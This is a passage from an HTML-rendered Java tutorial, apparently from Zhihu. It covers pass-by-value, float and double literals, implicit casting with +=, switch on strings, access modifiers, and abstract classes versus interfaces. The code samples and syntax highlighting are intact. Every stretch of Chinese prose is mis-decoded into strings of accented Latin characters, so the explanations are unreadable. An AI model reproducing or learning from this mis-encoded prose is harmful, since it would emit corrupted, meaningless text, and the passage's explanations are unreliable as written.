class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"kd\">super</span><span class=\"o\">.</span><span class=\"na\">toString</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">PassByValueExample</span> <span class=\"o\">{</span>\n    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">Dog</span> <span class=\"n\">dog</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Dog</span><span class=\"o\">(</span><span class=\"s\">&#34;A&#34;</span><span class=\"o\">);</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">dog</span><span class=\"o\">.</span><span class=\"na\">getObjectAddress</span><span class=\"o\">());</span> <span class=\"c1\">// Dog@4554617c\n</span><span class=\"c1\"></span>        <span class=\"n\">func</span><span class=\"o\">(</span><span class=\"n\">dog</span><span class=\"o\">);</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">dog</span><span class=\"o\">.</span><span class=\"na\">getObjectAddress</span><span class=\"o\">());</span> <span class=\"c1\">// Dog@4554617c\n</span><span class=\"c1\"></span>        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">dog</span><span class=\"o\">.</span><span class=\"na\">getName</span><span class=\"o\">());</span>          <span class=\"c1\">// A\n</span><span class=\"c1\"></span>    <span class=\"o\">}</span>\n\n    <span class=\"kd\">private</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">func</span><span class=\"o\">(</span><span class=\"n\">Dog</span> <span class=\"n\">dog</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">dog</span><span class=\"o\">.</span><span class=\"na\">getObjectAddress</span><span class=\"o\">());</span> <span class=\"c1\">// Dog@4554617c\n</span><span class=\"c1\"></span>        <span class=\"n\">dog</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Dog</span><span class=\"o\">(</span><span class=\"s\">&#34;B&#34;</span><span class=\"o\">);</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">dog</span><span class=\"o\">.</span><span class=\"na\">getObjectAddress</span><span class=\"o\">());</span> <span class=\"c1\">// Dog@74a14482\n</span><span class=\"c1\"></span>        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">dog</span><span class=\"o\">.</span><span class=\"na\">getName</span><span class=\"o\">());</span>          <span class=\"c1\">// B\n</span><span class=\"c1\"></span>    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><p>å¦‚æœåœ¨æ–¹æ³•ä¸­æ”¹å˜å¯¹è±¡çš„å­—æ®µå€¼ä¼šæ”¹å˜åŸå¯¹è±¡è¯¥å­—æ®µå€¼ï¼Œå› ä¸ºæ”¹å˜çš„æ˜¯åŒä¸€ä¸ªåœ°å€æŒ‡å‘çš„å†…å®¹ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">class</span> <span class=\"nc\">PassByValueExample</span> <span class=\"o\">{</span>\n    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">Dog</span> <span class=\"n\">dog</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Dog</span><span class=\"o\">(</span><span class=\"s\">&#34;A&#34;</span><span class=\"o\">);</span>\n        <span class=\"n\">func</span><span class=\"o\">(</span><span class=\"n\">dog</span><span class=\"o\">);</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">dog</span><span class=\"o\">.</span><span class=\"na\">getName</span><span class=\"o\">());</span>          <span class=\"c1\">// B\n</span><span class=\"c1\"></span>    <span class=\"o\">}</span>\n\n    <span class=\"kd\">private</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">func</span><span class=\"o\">(</span><span class=\"n\">Dog</span> <span class=\"n\">dog</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">dog</span><span class=\"o\">.</span><span class=\"na\">setName</span><span class=\"o\">(</span><span class=\"s\">&#34;B&#34;</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><p><a href=\"https://link.zhihu.com/?target=https%3A//stackoverflow.com/questions/40480/is-java-pass-by-reference-or-pass-by-value\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">StackOverflow: Is Java â€œpass-by-referenceâ€ or â€œpass-by-valueâ€?</a></p><h2>float ä¸ double</h2><p>Java ä¸èƒ½éšå¼æ‰§è¡Œå‘ä¸‹è½¬å‹ï¼Œå› ä¸ºè¿™ä¼šä½¿å¾—ç²¾åº¦é™ä½ã€‚</p><p>1.1 å­—é¢é‡å±äº double ç±»å‹ï¼Œä¸èƒ½ç›´æ¥å°† 1.1 ç›´æ¥èµ‹å€¼ç»™ float å˜é‡ï¼Œå› ä¸ºè¿™æ˜¯å‘ä¸‹è½¬å‹ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"o\">//</span> <span class=\"kt\">float</span> <span class=\"n\">f</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">.</span><span class=\"na\">1</span><span class=\"o\">;</span></code></pre></div><p>1.1f å­—é¢é‡æ‰æ˜¯ float ç±»å‹ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kt\">float</span> <span class=\"n\">f</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">.</span><span class=\"na\">1f</span><span class=\"o\">;</span></code></pre></div><h2>éšå¼ç±»å‹è½¬æ¢</h2><p>å› ä¸ºå­—é¢é‡ 1 æ˜¯ int ç±»å‹ï¼Œå®ƒæ¯” short ç±»å‹ç²¾åº¦è¦é«˜ï¼Œå› æ­¤ä¸èƒ½éšå¼åœ°å°† int ç±»å‹ä¸‹è½¬å‹ä¸º short ç±»å‹ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kt\">short</span> <span class=\"n\">s1</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n<span class=\"o\">//</span> <span class=\"n\">s1</span> <span class=\"o\">=</span> <span class=\"n\">s1</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">;</span></code></pre></div><p>ä½†æ˜¯ä½¿ç”¨ += æˆ–è€… ++ è¿ç®—ç¬¦å¯ä»¥æ‰§è¡Œéšå¼ç±»å‹è½¬æ¢ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">s1</span> <span class=\"o\">+=</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n<span class=\"o\">//</span> <span class=\"n\">s1</span><span class=\"o\">++;</span></code></pre></div><p>ä¸Šé¢çš„è¯­å¥ç›¸å½“äºå°† s1 + 1 çš„è®¡ç®—ç»“æœè¿›è¡Œäº†å‘ä¸‹è½¬å‹ï¼š</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">s1</span> <span class=\"o\">=</span> <span class=\"o\">(</span><span class=\"kt\">short</span><span class=\"o\">)</span> <span class=\"o\">(</span><span class=\"n\">s1</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">);</span></code></pre></div><p><a href=\"https://link.zhihu.com/?target=https%3A//stackoverflow.com/questions/8710619/why-dont-javas-compound-assignment-operators-require-casting\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">StackOverflow : Why don&#39;t Java&#39;s +=, -=, *=, /= compound assignment operators require casting?</a></p><h2>switch</h2><p>ä» Java 7 å¼€å§‹ï¼Œå¯ä»¥åœ¨ switch æ¡ä»¶åˆ¤æ–­è¯­å¥ä¸­ä½¿ç”¨ String å¯¹è±¡ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">String</span> <span class=\"n\">s</span> <span class=\"o\">=</span> <span class=\"s\">&#34;a&#34;</span><span class=\"o\">;</span>\n<span class=\"k\">switch</span> <span class=\"o\">(</span><span class=\"n\">s</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">case</span> <span class=\"s\">&#34;a&#34;</span><span class=\"o\">:</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;aaa&#34;</span><span class=\"o\">);</span>\n        <span class=\"k\">break</span><span class=\"o\">;</span>\n    <span class=\"k\">case</span> <span class=\"s\">&#34;b&#34;</span><span class=\"o\">:</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;bbb&#34;</span><span class=\"o\">);</span>\n        <span class=\"k\">break</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><p>switch ä¸æ”¯æŒ longï¼Œæ˜¯å› ä¸º switch çš„è®¾è®¡åˆè¡·æ˜¯å¯¹é‚£äº›åªæœ‰å°‘æ•°çš„å‡ ä¸ªå€¼è¿›è¡Œç­‰å€¼åˆ¤æ–­ï¼Œå¦‚æœå€¼è¿‡äºå¤æ‚ï¼Œé‚£ä¹ˆè¿˜æ˜¯ç”¨ if æ¯”è¾ƒåˆé€‚ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"c1\">// long x = 111;\n</span><span class=\"c1\">// switch (x) { // Incompatible types. Found: &#39;long&#39;, required: &#39;char, byte, short, int, Character, Byte, Short, Integer, String, or an enum&#39;\n</span><span class=\"c1\">//     case 111:\n</span><span class=\"c1\">//         System.out.println(111);\n</span><span class=\"c1\">//         break;\n</span><span class=\"c1\">//     case 222:\n</span><span class=\"c1\">//         System.out.println(222);\n</span><span class=\"c1\">//         break;\n</span><span class=\"c1\"></span><span class=\"o\">//</span> <span class=\"o\">}</span></code></pre></div><p><a href=\"https://link.zhihu.com/?target=https%3A//stackoverflow.com/questions/2676210/why-cant-your-switch-statement-data-type-be-long-java\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">StackOverflow : Why can&#39;t your switch statement data type be long, Java?</a></p><h2>å››ã€ç»§æ‰¿</h2><h2>è®¿é—®æƒé™</h2><p>Java ä¸­æœ‰ä¸‰ä¸ªè®¿é—®æƒé™ä¿®é¥°ç¬¦ï¼šprivateã€protected ä»¥åŠ publicï¼Œå¦‚æœä¸åŠ è®¿é—®ä¿®é¥°ç¬¦ï¼Œè¡¨ç¤ºåŒ…çº§å¯è§ã€‚</p><p>å¯ä»¥å¯¹ç±»æˆ–ç±»ä¸­çš„æˆå‘˜ï¼ˆå­—æ®µä»¥åŠæ–¹æ³•ï¼‰åŠ ä¸Šè®¿é—®ä¿®é¥°ç¬¦ã€‚</p><ul><li>ç±»å¯è§è¡¨ç¤ºå…¶å®ƒç±»å¯ä»¥ç”¨è¿™ä¸ªç±»åˆ›å»ºå®ä¾‹å¯¹è±¡ã€‚</li><li>æˆå‘˜å¯è§è¡¨ç¤ºå…¶å®ƒç±»å¯ä»¥ç”¨è¿™ä¸ªç±»çš„å®ä¾‹å¯¹è±¡è®¿é—®åˆ°è¯¥æˆå‘˜ï¼›</li></ul><p>protected ç”¨äºä¿®é¥°æˆå‘˜ï¼Œè¡¨ç¤ºåœ¨ç»§æ‰¿ä½“ç³»ä¸­æˆå‘˜å¯¹äºå­ç±»å¯è§ï¼Œä½†æ˜¯è¿™ä¸ªè®¿é—®ä¿®é¥°ç¬¦å¯¹äºç±»æ²¡æœ‰æ„ä¹‰ã€‚</p><p>è®¾è®¡è‰¯å¥½çš„æ¨¡å—ä¼šéšè—æ‰€æœ‰çš„å®ç°ç»†èŠ‚ï¼ŒæŠŠå®ƒçš„ API ä¸å®ƒçš„å®ç°æ¸…æ™°åœ°éš”ç¦»å¼€æ¥ã€‚æ¨¡å—ä¹‹é—´åªé€šè¿‡å®ƒä»¬çš„ API è¿›è¡Œé€šä¿¡ï¼Œä¸€ä¸ªæ¨¡å—ä¸éœ€è¦çŸ¥é“å…¶ä»–æ¨¡å—çš„å†…éƒ¨å·¥ä½œæƒ…å†µï¼Œè¿™ä¸ªæ¦‚å¿µè¢«ç§°ä¸ºä¿¡æ¯éšè—æˆ–å°è£…ã€‚å› æ­¤è®¿é—®æƒé™åº”å½“å°½å¯èƒ½åœ°ä½¿æ¯ä¸ªç±»æˆ–è€…æˆå‘˜ä¸è¢«å¤–ç•Œè®¿é—®ã€‚</p><p>å¦‚æœå­ç±»çš„æ–¹æ³•é‡å†™äº†çˆ¶ç±»çš„æ–¹æ³•ï¼Œé‚£ä¹ˆå­ç±»ä¸­è¯¥æ–¹æ³•çš„è®¿é—®çº§åˆ«ä¸å…è®¸ä½äºçˆ¶ç±»çš„è®¿é—®çº§åˆ«ã€‚è¿™æ˜¯ä¸ºäº†ç¡®ä¿å¯ä»¥ä½¿ç”¨çˆ¶ç±»å®ä¾‹çš„åœ°æ–¹éƒ½å¯ä»¥ä½¿ç”¨å­ç±»å®ä¾‹ï¼Œä¹Ÿå°±æ˜¯ç¡®ä¿æ»¡è¶³é‡Œæ°æ›¿æ¢åŸåˆ™ã€‚</p><p>å­—æ®µå†³ä¸èƒ½æ˜¯å…¬æœ‰çš„ï¼Œå› ä¸ºè¿™ä¹ˆåšçš„è¯å°±å¤±å»äº†å¯¹è¿™ä¸ªå­—æ®µä¿®æ”¹è¡Œä¸ºçš„æ§åˆ¶ï¼Œå®¢æˆ·ç«¯å¯ä»¥å¯¹å…¶éšæ„ä¿®æ”¹ã€‚ä¾‹å¦‚ä¸‹é¢çš„ä¾‹å­ä¸­ï¼ŒAccessExample æ‹¥æœ‰ id å…¬æœ‰å­—æ®µï¼Œå¦‚æœåœ¨æŸä¸ªæ—¶åˆ»ï¼Œæˆ‘ä»¬æƒ³è¦ä½¿ç”¨ int å­˜å‚¨ id å­—æ®µï¼Œé‚£ä¹ˆå°±éœ€è¦ä¿®æ”¹æ‰€æœ‰çš„å®¢æˆ·ç«¯ä»£ç ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">AccessExample</span> <span class=\"o\">{</span>\n    <span class=\"kd\">public</span> <span class=\"n\">String</span> <span class=\"n\">id</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><p>å¯ä»¥ä½¿ç”¨å…¬æœ‰çš„ getter å’Œ setter æ–¹æ³•æ¥æ›¿æ¢å…¬æœ‰å­—æ®µï¼Œè¿™æ ·çš„è¯å°±å¯ä»¥æ§åˆ¶å¯¹å­—æ®µçš„ä¿®æ”¹è¡Œä¸ºã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">AccessExample</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">id</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">public</span> <span class=\"n\">String</span> <span class=\"nf\">getId</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"n\">id</span> <span class=\"o\">+</span> <span class=\"s\">&#34;&#34;</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">setId</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">id</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">id</span> <span class=\"o\">=</span> <span class=\"n\">Integer</span><span class=\"o\">.</span><span class=\"na\">valueOf</span><span class=\"o\">(</span><span class=\"n\">id</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><p>ä½†æ˜¯ä¹Ÿæœ‰ä¾‹å¤–ï¼Œå¦‚æœæ˜¯åŒ…çº§ç§æœ‰çš„ç±»æˆ–è€…ç§æœ‰çš„åµŒå¥—ç±»ï¼Œé‚£ä¹ˆç›´æ¥æš´éœ²æˆå‘˜ä¸ä¼šæœ‰ç‰¹åˆ«å¤§çš„å½±å“ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">AccessWithInnerClassExample</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"kd\">class</span> <span class=\"nc\">InnerClass</span> <span class=\"o\">{</span>\n        <span class=\"kt\">int</span> <span class=\"n\">x</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">private</span> <span class=\"n\">InnerClass</span> <span class=\"n\">innerClass</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">public</span> <span class=\"nf\">AccessWithInnerClassExample</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"n\">innerClass</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">InnerClass</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">getValue</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"n\">innerClass</span><span class=\"o\">.</span><span class=\"na\">x</span><span class=\"o\">;</span>  <span class=\"c1\">// ç›´æ¥è®¿é—®\n</span><span class=\"c1\"></span>    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><h2>æŠ½è±¡ç±»ä¸æ¥å£</h2><p><b>1. æŠ½è±¡ç±»</b> </p><p>æŠ½è±¡ç±»å’ŒæŠ½è±¡æ–¹æ³•éƒ½ä½¿ç”¨ abstract å…³é”®å­—è¿›è¡Œå£°æ˜ã€‚æŠ½è±¡ç±»ä¸€èˆ¬ä¼šåŒ…å«æŠ½è±¡æ–¹æ³•ï¼ŒæŠ½è±¡æ–¹æ³•ä¸€å®šä½äºæŠ½è±¡ç±»ä¸­ã€‚</p><p>æŠ½è±¡ç±»å’Œæ™®é€šç±»æœ€å¤§çš„åŒºåˆ«æ˜¯ï¼ŒæŠ½è±¡ç±»ä¸èƒ½è¢«å®ä¾‹åŒ–ï¼Œéœ€è¦ç»§æ‰¿æŠ½è±¡ç±»æ‰èƒ½å®ä¾‹åŒ–å…¶å­ç±»ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">abstract</span> <span class=\"kd\">class</span> <span class=\"nc\">AbstractClassExample</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">protected</span> <span class=\"kt\">int</span> <span class=\"n\">x</span><span class=\"o\">;</span>\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">y</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">public</span> <span class=\"kd\">abstract</span> <span class=\"kt\">void</span> <span class=\"nf\">func1</span><span class=\"o\">();</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">func2</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;func2&#34;</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">AbstractExtendClassExample</span> <span class=\"kd\">extends</span> <span class=\"n\">AbstractClassExample</span> <span class=\"o\">{</span>\n    <span class=\"nd\">@Override</span>\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">func1</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;func1&#34;</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"c1\">// AbstractClassExample ac1 = new AbstractClassExample(); // &#39;AbstractClassExample&#39; is abstract; cannot be instantiated\n</span><span class=\"c1\"></span><span class=\"n\">AbstractClassExample</span> <span class=\"n\">ac2</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">AbstractExtendClassExample</span><span class=\"o\">();</span>\n<span class=\"n\">ac2</span><span class=\"o\">.</span><span class=\"na\">func1</span><span class=\"o\">();</span></code></pre></div><p><b>2. æ¥å£</b> </p><p>æ¥å£æ˜¯æŠ½è±¡ç±»çš„å»¶ä¼¸ï¼Œåœ¨ Java 8 ä¹‹å‰ï¼Œå®ƒå¯ä»¥çœ‹æˆæ˜¯ä¸€ä¸ªå®Œå…¨æŠ½è±¡çš„ç±»ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒä¸èƒ½æœ‰ä»»ä½•çš„æ–¹æ³•å®ç°ã€‚</p><p>ä» Java 8 å¼€å§‹ï¼Œæ¥å£ä¹Ÿå¯ä»¥æ‹¥æœ‰é»˜è®¤çš„æ–¹æ³•å®ç°ï¼Œè¿™æ˜¯å› ä¸ºä¸æ”¯æŒé»˜è®¤æ–¹æ³•çš„æ¥å£çš„ç»´æŠ¤æˆæœ¬å¤ªé«˜äº†ã€‚åœ¨ Java 8 ä¹‹å‰ï¼Œå¦‚æœä¸€ä¸ªæ¥å£æƒ³è¦æ·»åŠ æ–°çš„æ–¹æ³•ï¼Œé‚£ä¹ˆè¦ä¿®æ”¹æ‰€æœ‰å®ç°äº†è¯¥æ¥å£çš„ç±»ã€‚</p><p>æ¥å£çš„æˆå‘˜ï¼ˆå­—æ®µ + æ–¹æ³•ï¼‰é»˜è®¤éƒ½æ˜¯ public çš„ï¼Œå¹¶ä¸”ä¸å…è®¸å®šä¹‰ä¸º private æˆ–è€… protectedã€‚</p><p>æ¥å£çš„å­—æ®µé»˜è®¤éƒ½æ˜¯ static å’Œ final çš„ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">interface</span> <span class=\"nc\">InterfaceExample</span> <span class=\"o\">{</span>\n\n    <span class=\"kt\">void</span> <span class=\"nf\">func1</span><span class=\"o\">();</span>\n\n    <span class=\"k\">default</span> <span class=\"kt\">void</span> <span class=\"nf\">func2</span><span class=\"o\">(){</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;func2&#34;</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kt\">int</span> <span class=\"n\">x</span> <span class=\"o\">=</span> <span class=\"n\">123</span><span class=\"o\">;</span>\n    <span class=\"c1\">// int y;               // Variable &#39;y&#39; might not have been initialized\n</span><span class=\"c1\"></span>    <span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"n\">z</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span>       <span class=\"c1\">// Modifier &#39;public&#39; is redundant for interface fields\n</span><span class=\"c1\"></span>    <span class=\"c1\">// private int k = 0;   // Modifier &#39;private&#39; not allowed here\n</span><span class=\"c1\"></span>    <span class=\"c1\">// protected int l = 0; // Modifier &#39;protected&#39; not allowed here\n</span><span class=\"c1\"></span>    <span class=\"c1\">// private void fun3(); // Modifier &#39;private&#39; not allowed here\n</span><span class=\"c1\"></span><span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">InterfaceImplementExample</span> <span class=\"kd\">implements</span> <span class=\"n\">InterfaceExample</span> <span class=\"o\">{</span>\n    <span class=\"nd\">@Override</span>\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">func1</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;func1&#34;</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"c1\">// InterfaceExample ie1 = new InterfaceExample(); // &#39;InterfaceExample&#39; is abstract; cannot be instantiated\n</span><span class=\"c1\"></span><span class=\"n\">InterfaceExample</span> <span class=\"n\">ie2</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">InterfaceImplementExample</span><span class=\"o\">();</span>\n<span class=\"n\">ie2</span><span class=\"o\">.</span><span class=\"na\">func1</span><span class=\"o\">();</span>\n<span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">InterfaceExample</span><span class=\"o\">.</span><span class=\"na\">x</span><span class=\"o\">);</span></code></pre></div><p><b>3. æ¯”è¾ƒ</b> </p><ul><li>ä»è®¾è®¡å±‚é¢ä¸Šçœ‹ï¼ŒæŠ½è±¡ç±»æä¾›äº†ä¸€ç§ IS-A å…³ç³»ï¼Œé‚£ä¹ˆå°±å¿…é¡»æ»¡è¶³é‡Œå¼æ›¿æ¢åŸåˆ™ï¼Œå³å­ç±»å¯¹è±¡å¿…é¡»èƒ½å¤Ÿæ›¿æ¢æ‰æ‰€æœ‰çˆ¶ç±»å¯¹è±¡ã€‚è€Œæ¥å£æ›´åƒæ˜¯ä¸€ç§ LIKE-A å…³ç³»ï¼Œå®ƒåªæ˜¯æä¾›ä¸€ç§æ–¹æ³•å®ç°å¥‘çº¦ï¼Œå¹¶ä¸è¦æ±‚æ¥å£å’Œå®ç°æ¥å£çš„ç±»å…·æœ‰ IS-A å…³ç³»ã€‚</li><li>ä»ä½¿ç”¨ä¸Šæ¥çœ‹ï¼Œä¸€ä¸ªç±»å¯ä»¥å®ç°å¤šä¸ªæ¥å£ï¼Œä½†æ˜¯ä¸èƒ½ç»§æ‰¿å¤šä¸ªæŠ½è±¡ç±»ã€‚</li><li>æ¥å£çš„å­—æ®µåªèƒ½æ˜¯ static å’Œ final ç±»å‹çš„ï¼Œè€ŒæŠ½è±¡ç±»çš„å­—æ®µæ²¡æœ‰è¿™ç§é™åˆ¶ã€‚</li><li>æ¥å£çš„æˆå‘˜åªèƒ½æ˜¯ public çš„ï¼Œè€ŒæŠ½è±¡ç±»çš„æˆå‘˜å¯ä»¥æœ‰å¤šç§è®¿é—®æƒé™ã€‚</li></ul><p><b>4. ä½¿ç”¨é€‰æ‹©</b> </p><p>ä½¿ç”¨æ¥å£ï¼š</p><ul><li>éœ€è¦è®©ä¸ç›¸å…³çš„ç±»éƒ½å®ç°ä¸€ä¸ªæ–¹æ³•ï¼Œä¾‹å¦‚ä¸ç›¸å…³çš„ç±»éƒ½å¯ä»¥å®ç° Compareable æ¥å£ä¸­çš„ compareTo() æ–¹æ³•ï¼›</li><li>éœ€è¦ä½¿ç”¨å¤šé‡ç»§æ‰¿ã€‚</li></ul><p>ä½¿ç”¨æŠ½è±¡ç±»ï¼š</p><ul><li>éœ€è¦åœ¨å‡ ä¸ªç›¸å…³çš„ç±»ä¸­å…±äº«ä»£ç ã€‚</li><li>éœ€è¦èƒ½æ§åˆ¶ç»§æ‰¿æ¥çš„æˆå‘˜çš„è®¿é—®æƒé™ï¼Œè€Œä¸æ˜¯éƒ½ä¸º publicã€‚</li><li>éœ€è¦ç»§æ‰¿éé™æ€å’Œéå¸¸é‡å­—æ®µã€‚</li></ul><p>åœ¨å¾ˆå¤šæƒ…å†µä¸‹ï¼Œæ¥å£ä¼˜å…ˆäºæŠ½è±¡ç±»ã€‚å› ä¸ºæ¥å£æ²¡æœ‰æŠ½è±¡ç±»ä¸¥æ ¼çš„ç±»å±‚æ¬¡ç»“æ„è¦æ±‚ï¼Œå¯ä»¥çµæ´»åœ°ä¸ºä¸€ä¸ªç±»æ·»åŠ è¡Œä¸ºã€‚å¹¶ä¸”ä» Java 8 å¼€å§‹ï¼Œæ¥å£ä¹Ÿå¯ä»¥æœ‰é»˜è®¤çš„æ–¹æ³•å®ç°ï¼Œä½¿å¾—ä¿®æ”¹æ¥å£çš„æˆæœ¬ä¹Ÿå˜çš„å¾ˆä½ã€‚</p><ul><li><a href=\"https://link.zhihu.com/?target=https%3A//www.ibm.com/developerworks/cn/java/l-javainterface-abstract/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">æ·±å…¥ç†è§£ abstract class å’Œ interface</a></li><li><a 